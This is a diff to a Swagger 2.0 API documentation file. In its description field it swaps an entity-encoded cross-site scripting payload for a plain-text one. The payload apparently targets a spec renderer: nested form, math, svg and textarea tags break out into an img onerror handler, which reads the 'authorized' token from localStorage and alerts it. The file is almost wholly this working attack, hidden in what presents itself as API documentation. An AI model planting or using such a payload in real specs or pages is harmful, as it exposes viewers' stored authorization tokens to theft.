@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror='&#x76;&#x61;&#x72;&#x20;&#x61;&#x3d;&#x6c;&#x6f;&#x63;&#x61;&#x6c;&#x53;&#x74;&#x6f;&#x72;&#x61;&#x67;&#x65;&#x2e;&#x67;&#x65;&#x74;&#x49;&#x74;&#x65;&#x6d;&#x28;&#x5c;&#x27;&#x61;&#x75;&#x74;&#x68;&#x6f;&#x72;&#x69;&#x7a;&#x65;&#x64;&#x5c;&#x27;&#x29;&#x3b;&#x20;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x61;&#x29;&#x3b;' src=1>"></form>
+     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror='var a=localStorage.getItem(\'authorized\'); alert(a);' src=1>"></form>
   version: production
 basePath: /JSSResource/
 produces:
